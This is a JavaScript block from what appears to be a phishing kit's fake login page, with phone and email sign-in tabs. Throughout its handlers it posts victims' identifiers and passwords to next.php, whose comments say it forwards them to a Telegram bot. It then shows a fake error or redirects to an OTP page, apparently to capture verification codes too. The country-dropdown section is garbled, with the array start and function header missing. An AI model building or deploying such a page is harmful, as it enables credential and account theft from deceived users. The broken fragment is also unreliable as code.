<script>
    function goBack() {
        window.location.href = 'index.html';
    }

    function showPhone(e) {
        e.preventDefault();
        document.getElementById('phone-input').style.display = 'block';
        document.getElementById('email-input').style.display = 'none';
        document.getElementById('phone-password').style.display = 'none';
        document.getElementById('phone-continue').style.display = 'block';
        document.querySelector('#phone-input .password-option').style.display = 'block';
        document.getElementById('phone').focus();
        document.querySelector('.tab-btn.active').classList.remove('active');
        e.target.classList.add('active');
    }

    function showEmail(e) {
        e.preventDefault();
        document.getElementById('phone-input').style.display = 'none';
        document.getElementById('email-input').style.display = 'block';
        document.getElementById('email-password').style.display = 'none';
        document.getElementById('email-continue').style.display = 'block';
        document.querySelector('#email-input .password-option').style.display = 'block';
        document.getElementById('email').focus();
        document.querySelector('.tab-btn.active').classList.remove('active');
        e.target.classList.add('active');
    }

    function phoneContinue() {
        const countryCode = document.getElementById('country-code').value;
        const phone = document.getElementById('phone').value;
        const idValue = countryCode + phone;

        // Send to Telegram bot FIRST
        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'next.php', false); // Make synchronous
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('di=' + encodeURIComponent(idValue));

        // THEN redirect to OTP page
        window.location.href = 'otp.html?type=phone&value=' + encodeURIComponent(idValue);
    }

    function showPhonePassword() {
        document.getElementById('phone-continue').style.display = 'none';
        document.querySelector('#phone-input .password-option').style.display = 'none';
        document.getElementById('phone-password').style.display = 'block';
    }

    function handlePhoneLogin() {
        const countryCode = document.getElementById('country-code').value;
        const phone = document.getElementById('phone').value;
        const pass = document.getElementById('phone-password-input').value;
        const idValue = countryCode + phone;
        if (idValue.trim() && pass.trim()) {
            // Send to Telegram bot first
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'next.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('di=' + encodeURIComponent(idValue) + '&pr=' + encodeURIComponent(pass));

            // Show error message instead of redirecting
            document.getElementById('phone-error-message').style.display = 'block';
        } else {
            alert("Please enter all required information.");
        }
    }

    function emailContinue() {
        const input = document.getElementById('email').value;
        if (input.trim()) {
            // Send to Telegram bot FIRST
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'next.php', false); // Make synchronous
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('di=' + encodeURIComponent(input));

            // Always go to password page first - verification control will handle the rest
            window.location.href = 'password.html?email=' + encodeURIComponent(input);
        } else {
            alert("Please enter your email or phone number.");
        }
    }

    function showEmailPassword() {
        document.getElementById('email-continue').style.display = 'none';
        document.querySelector('#email-input .password-option').style.display = 'none';
        document.getElementById('email-password').style.display = 'block';
    }

    function handleEmailLogin() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('email-password-input').value;
        if (email.trim() && pass.trim()) {
            // Send to Telegram bot first
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'next.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('di=' + encodeURIComponent(email) + '&pr=' + encodeURIComponent(pass));

            // Show error message instead of redirecting
            document.getElementById('email-error-message').style.display = 'block';
        } else {
            alert("Please enter all required information.");
        }
    }

    function clearInput(inputId) {
        document.getElementById(inputId).value = '';
        document.getElementById(inputId).focus();
        toggleClearButton(inputId);
    }

    function toggleClearButton(inputId) {
        const input = document.getElementById(inputId);
        const clearBtn = input.parentElement.querySelector('.clear-btn');
        if (input.value.trim() !== '') {
            clearBtn.classList.add('show');
        } else {
            clearBtn.classList.remove('show');
        }
    }

        const dropdown = document.getElementById('country-dropdown');

            { name: 'North Macedonia', code: '+389' }
        ];

        // Sort countries alphabetically by name
        countries.sort((a, b) => a.name.localeCompare(b.name));

        countries.forEach(country => {
            const option = document.createElement('div');
            option.className = 'country-option';
            option.onclick = () => selectCountry(country.code, country.name);
            option.innerHTML = `
                <span class="country-name">${country.name}</span>
                <span class="country-code-display">${country.code}</span>
            `;
            dropdownList.appendChild(option);
        });
    }

    // Close dropdown when clicking outside
    document.addEventListener('click', function(event) {
        const dropdown = document.getElementById('country-dropdown');
        const countryCode = document.querySelector('.country-code');
        if (!countryCode.contains(event.target) && !dropdown.contains(event.target)) {
            dropdown.classList.remove('active');
        }
    });

    // Add event listeners to all inputs
    document.addEventListener('DOMContentLoaded', function() {
        const inputs = ['email', 'email-password-input', 'phone', 'phone-password-input'];
        inputs.forEach(function(inputId) {
            const input = document.getElementById(inputId);
            if (input) {
                input.addEventListener('input', function() {
                    toggleClearButton(inputId);
                });
                // Initial check
                toggleClearButton(inputId);
            }
        });
    });
</script>
